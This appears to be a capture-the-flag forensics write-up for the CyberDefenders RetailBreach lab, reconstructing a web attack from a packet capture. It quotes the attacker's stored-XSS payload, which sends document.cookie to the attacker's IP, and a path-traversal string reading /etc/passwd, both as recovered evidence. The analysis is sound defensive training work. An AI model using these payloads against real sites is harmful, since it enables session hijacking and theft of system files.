# RetailBreach PCAP Analysis (CyberDefenders)

## Objective
Analyze web traffic to identify suspicious activity against a retail web application, reconstruct the attacker’s actions from directory enumeration to stored XSS and session hijacking, and determine which post-compromise actions were performed through the administrative interface.

## Scenario
The exercise is based on a PCAP containing suspicious HTTP traffic associated with attacker interaction against an online retail platform.

The goal is to reconstruct the attacker’s actions by identifying:
- the attacker IP
- the directory enumeration tool
- the XSS payload used against the application
- the first time the admin user visited the infected page
- the stolen session token
- the exploited administrative script
- the payload used to access a sensitive local file
- the main post-compromise activity performed through the admin area

## References
- CyberDefenders: RetailBreach Lab
- Main activity types observed during analysis:
  - HTTP directory enumeration
  - malicious review submission
  - stored XSS
  - session hijacking through cookie theft
  - authenticated access to admin pages
  - path traversal / local file access

## Tools Used
- Wireshark
- Statistics → Conversations
- HTTP packet inspection
- Follow HTTP Stream
- Display filters
- Packet details pane
- URL decoding

## Investigation Workflow
1. Reviewed the traffic at a high level and quickly recognized that the lab was almost entirely HTTP-focused, so the main task was web attack reconstruction rather than protocol-heavy packet analysis.
2. Identified the suspicious external host by looking for repeated automated `GET` requests against many hidden paths on the web server.
3. Interpreted that burst of requests as directory enumeration rather than normal browsing activity.
4. Clarified that the question asking for the **tool** referred to the concrete program used, not just the generic technique, so the useful evidence had to come from request metadata such as the `User-Agent`.
5. Switched from simple path enumeration to attacker-controlled form submissions and isolated the malicious review request used to inject the XSS payload.
6. Decoded the injected value to recover the readable JavaScript and confirm that the goal of the payload was cookie theft rather than generic script execution.
7. Interpreted the “first time the admin user visited the infected page” question as a victim-side execution event, not the attacker’s injection time.
8. Tracked the admin-side requests after the injection and identified the first request where the infected content was actually viewed.
9. Treated the “session token” question as a session-cookie question and linked the stolen token to later attacker requests that reused the victim’s authenticated state.
10. Clarified that the question asking for the exploited **script** referred to the vulnerable server-side web file, not to the JavaScript payload itself.
11. Identified the later administrative request used to access a sensitive system file and interpreted the requested **payload** in the lab’s broad sense: the malicious traversal string inserted into the request.
12. Because the lab was easy overall, the main effort was not packet extraction but translating ambiguous challenge wording into precise technical questions before answering.

## Key Evidence
- Web server identified during analysis:
  - `73.124.17.52`
- Attacker host identified during analysis:
  - `111.224.180.128`
- Admin / victim host identified during analysis:
  - `135.143.42.5`
- Evidence of automated hidden-path discovery:
  - repeated `GET` requests against non-obvious paths
- Evidence relevant to the tool question:
  - the useful distinction was between:
    - technique: directory enumeration / content discovery
    - concrete tool: value recoverable from `User-Agent`
- Directory enumeration tool identified during analysis:
  - `gobuster`
- Evidence relevant to the XSS question:
  - malicious content submitted through the review functionality
  - encoded payload requiring decoding before it was readable
- XSS payload recovered during analysis:
  - `<script>fetch('http://111.224.180.128/' + document.cookie);</script>`
- Evidence relevant to the victim-view timestamp question:
  - the important event was the first admin request to the page containing the injected malicious content
  - this was not the same as the attacker’s original injection request
- First admin visit to the infected page identified during analysis:
  - `2024-03-29 12:09:29.471547 UTC`
- Evidence relevant to the session theft question:
  - the stolen value was a session identifier reused later by the attacker
- Stolen session token identified during analysis:
  - `lqkctf24s9h9lg67teu8uevn3q`
- Exploited administrative script identified during analysis:
  - `log_viewer.php`
- Evidence relevant to the local file access question:
  - attacker request containing a traversal sequence targeting a system file
- Sensitive file access payload identified during analysis:
  - `../../../../../etc/passwd`

## Findings
- The main analytical difficulty in this lab was not packet complexity but question wording.
- The traffic itself was mostly easy to interpret once the attack chain was understood.
- The first major structural point was that the PCAP was centered on web-application abuse rather than on a broader multi-protocol investigation:
  - **Observed:** the relevant activity was concentrated around HTTP requests tied to enumeration, input injection, victim page views, and authenticated admin access
  - **Conclusion:** the main task was to reconstruct a web attack chain, not to solve a protocol-comprehension problem
- A recurring source of friction was vague wording such as `tool`, `script`, `token`, `payload`, and `page`:
  - **Observed:** several questions could be interpreted either as generic concepts or as very specific artifacts in the traffic
  - **Conclusion:** the real task was often to first translate the challenge wording into a precise web-forensics question before filtering packets
- The **tool** question required a technique-versus-program distinction:
  - **Observed:** repeated hidden-path `GET` requests only proved directory enumeration as a technique
  - **Conclusion:** the actual answer had to come from identifying metadata such as the `User-Agent`, which pointed to `gobuster`
- The XSS part was straightforward once attacker-controlled input was isolated:
  - **Observed:** the malicious input was submitted through the review functionality and had to be decoded to become readable
  - **Conclusion:** the goal of the XSS was session theft by exfiltrating `document.cookie`
- The timestamp question was easy to misread:
  - **Observed:** the question asked when the admin first viewed the infected page, not when the attacker injected the payload
  - **Conclusion:** the correct timestamp had to come from the victim-side page view event
- The **session token** question was really about cookie theft:
  - **Observed:** the attacker later reused a valid session identifier rather than authenticating normally
  - **Conclusion:** the compromise was based on session hijacking, not password theft
- The **script** question was also phrased loosely:
  - **Observed:** the expected answer was the vulnerable administrative PHP file
  - **Conclusion:** here `script` meant the abused server-side endpoint, not the injected JavaScript
- The later **payload** question used the word in a broad lab sense:
  - **Observed:** the answer was a traversal string used to reach `/etc/passwd`
  - **Conclusion:** the lab used `payload` to mean any malicious exploit input, not necessarily code
- Some of the deeper reasoning done during the lab was curiosity-driven rather than required:
  - understanding why the challenge said `tool` instead of simply asking for the `User-Agent`-identified program
  - understanding why the victim-view event mattered more than the injection time for the compromise timeline
  - understanding why `payload` was being used even for a simple traversal string
- The rest of the lab was easy overall, and many answers were found immediately once the wording was translated into precise technical meaning.

## Result
- Web Server: `73.124.17.52`
- Attacker IP: `111.224.180.128`
- Admin / Victim IP: `135.143.42.5`
- Directory Enumeration Tool: `gobuster`
- XSS Payload: `<script>fetch('http://111.224.180.128/' + document.cookie);</script>`
- First Admin Visit to the Infected Page: `2024-03-29 12:09:29.471547 UTC`
- Stolen Session Token: `lqkctf24s9h9lg67teu8uevn3q`
- Exploited Script: `log_viewer.php`
- Sensitive File Access Payload: `../../../../../etc/passwd`

## Mistakes / Friction Points
- The main difficulty was the ambiguity of the challenge wording:
  - several questions did not clearly specify whether they wanted a generic concept or a concrete artifact from the traffic
- A second friction point was the lack of precise terminology:
  - `tool` could be misread as the general technique instead of the exact program
  - `script` could be misread as JavaScript instead of a PHP endpoint
  - `token` could sound vague until translated into session cookie / session identifier
  - `payload` was used even for a simple traversal string
- The XSS timestamp question was especially easy to misread:
  - it was natural to initially think about the attacker’s injection time
  - the actual question referred to the first victim/admin visit to the infected page
- Some additional reasoning time was spent on wording interpretation out of curiosity rather than necessity:
  - what exactly the lab meant by `tool`
  - what exactly it meant by `payload`
  - why the victim-side execution moment was the important compromise timestamp
- The remaining parts that are not emphasized here were mostly easy and were often solved immediately once the wording was translated correctly.

## Notes
- In a real investigation, stronger context would normally already exist in the form of:
  - web server logs
  - reverse proxy logs
  - application logs
  - session-store evidence
  - source code review of the vulnerable endpoints
- Because of that, many of the ambiguities present in this lab would usually be clarified much earlier in a real workflow.
- The most useful mindset in this lab was to first translate each question into a precise technical meaning before trying to answer from the packets.
- The exercise also reinforced some practical distinctions:
  - repeated hidden-path `GET` requests show the enumeration technique
  - request metadata such as `User-Agent` identifies the concrete tool
  - XSS should be thought of as attacker-controlled input plus browser execution, not just as “a suspicious POST”
  - the session token in this context is the stolen session cookie / session identifier
  - the lab uses `payload` broadly for any malicious input string, including path traversal
- Because the lab was easy overall, the main value came from clarifying what the questions actually meant and from understanding why the expected answers were phrased the way they were.
